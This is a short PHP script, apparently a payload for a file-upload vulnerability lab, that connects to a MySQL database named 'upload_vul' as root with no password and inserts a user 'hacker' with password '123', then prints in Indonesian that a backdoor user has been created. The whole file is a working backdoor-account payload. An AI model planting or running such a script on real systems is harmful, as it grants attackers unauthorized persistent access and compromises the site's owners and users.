<?php
$pdo = new PDO("mysql:host=localhost;dbname=upload_vul", "root", "");
$pdo->exec("INSERT INTO users (username,password) VALUES ('hacker', '123')");
echo "User Backdoor telah dibuat";
?>